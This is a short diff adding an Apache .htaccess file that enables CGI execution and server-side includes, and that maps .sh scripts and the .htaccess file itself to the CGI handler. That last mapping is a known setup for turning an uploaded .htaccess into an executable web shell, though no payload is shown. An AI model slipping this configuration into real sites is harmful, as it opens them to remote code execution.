@@ -1,0 +1,4 @@
+Options			Includes ExecCGI
+AddHandler	server-parsed .html .htm .shtml
+Addtype			application/x-httpd-cgi .cgi .sh .pl
+AddType			application/x-httpd-cgi .htaccess
